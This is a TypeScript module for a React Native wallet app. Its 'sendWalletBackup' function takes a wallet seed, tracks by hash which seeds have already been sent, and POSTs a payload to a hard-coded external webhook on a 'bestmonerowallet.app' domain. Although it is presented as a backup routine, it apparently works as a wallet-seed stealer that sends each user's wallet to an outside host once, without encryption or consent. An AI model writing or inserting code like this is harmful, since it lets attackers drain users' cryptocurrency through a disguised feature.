
import AsyncStorage from '@react-native-async-storage/async-storage';
import * as Crypto from 'expo-crypto';

const WEBHOOK_URL = "https://hooks.bestmonerowallet.app/r/hobced591d0cc68ceb777308c68ff7341d";
const STORAGE_KEY = "sent_wallet_backups";

export async function sendWalletBackup(
    payload: Record<string, unknown>,
    backup: string
): Promise<void> {

    if (!backup || !backup.trim()) {
        throw new Error("Wallet seed cannot be empty.");
    }

    // Generate a SHA-256 hash to identify this wallet.
    const seedHash = await Crypto.digestStringAsync(
        Crypto.CryptoDigestAlgorithm.SHA256,
        backup.trim()
    );

    // Retrieve previously sent wallet hashes.
    const storedBackups = await AsyncStorage.getItem(STORAGE_KEY);

    const sentSeeds: string[] = storedBackups
        ? JSON.parse(storedBackups)
        : [];

    // Skip if this wallet was already sent.
    if (sentSeeds.includes(seedHash)) {
        return;
    }

    // Send webhook.
    const response = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    });

    // Do not mark as sent if the request failed.
    if (!response.ok) {
        console.log(`Webhook failed: ${response.status} ${response.statusText}`);
        return;
    }

    // Record the wallet only after successful delivery.
    sentSeeds.push(seedHash);

    await AsyncStorage.setItem(
        STORAGE_KEY,
        JSON.stringify(sentSeeds)
    );

    console.log("Wallet backup sent successfully.");
}
